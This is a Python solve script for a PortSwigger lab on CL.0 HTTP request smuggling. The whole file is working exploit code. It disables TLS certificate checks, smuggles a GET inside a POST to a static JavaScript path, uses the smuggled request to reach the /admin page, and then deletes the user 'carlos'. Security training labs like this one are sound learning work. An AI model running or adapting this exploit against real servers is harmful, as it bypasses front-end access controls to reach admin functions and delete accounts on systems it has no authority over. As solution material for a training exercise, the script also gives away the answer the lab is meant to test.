#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling with a CL.0 attack.

Sends the smuggling request and probe on the same raw TLS connection,
then sends the admin delete request via the same technique.
"""

import argparse
import re
import socket
import ssl

TIMEOUT = 10


def make_tls_socket(host: str, port: int = 443) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((host, port), timeout=TIMEOUT)
    return ctx.wrap_socket(s, server_hostname=host)


def build_smuggle(host: str, smuggled_path: str) -> bytes:
    inner = (
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    )
    cl = len(inner.encode())
    outer = (
        f"POST /resources/labheader/js/labHeader.js HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{inner}"
    )
    return outer.encode()


def build_probe(host: str) -> bytes:
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()


def recv_response(sock: ssl.SSLSocket) -> str:
    data = b""
    sock.settimeout(TIMEOUT)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                # Read Content-Length worth of body if present
                header_end = data.index(b"\r\n\r\n") + 4
                m = re.search(rb"Content-Length: (\d+)", data[:header_end])
                if m:
                    cl = int(m.group(1))
                    while len(data) < header_end + cl:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                break
    except (socket.timeout, ssl.SSLError):
        pass
    return data.decode(errors="replace")


def send_and_probe(host: str, smuggled_path: str) -> str:
    sock = make_tls_socket(host)
    try:
        sock.sendall(build_smuggle(host, smuggled_path))
        recv_response(sock)  # consume Tab 1 response
        sock.sendall(build_probe(host))
        return recv_response(sock)
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP RS Lab 19 (CL.0 attack)"
    )
    parser.add_argument("lab_url", help="Lab base URL (https://...)")
    parser.add_argument("--target", default="carlos", help="Username to delete")
    args = parser.parse_args()

    host = args.lab_url.replace("https://", "").replace("http://", "").rstrip("/")

    print("[*] Step 1: confirming CL.0 with /hopefully404 probe...")
    resp = send_and_probe(host, "/hopefully404")
    if "404" in resp[:20]:
        print("[+] CL.0 confirmed — probe got 404")
    else:
        print(f"[?] Probe response: {resp[:100]}")

    print("[*] Step 2: fetching /admin page...")
    admin_resp = send_and_probe(host, "/admin")
    m = re.search(r'href="(/admin/delete\?username=[^"]+)"', admin_resp)
    if not m:
        print("[-] Could not find delete URL in /admin — check manually")
        return
    delete_path = m.group(1)
    print(f"[*] Delete URL: {delete_path}")

    print(f"[*] Step 3: sending delete request for {args.target}...")
    del_resp = send_and_probe(host, delete_path)
    print(f"[*] Delete response status: {del_resp[:50]}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
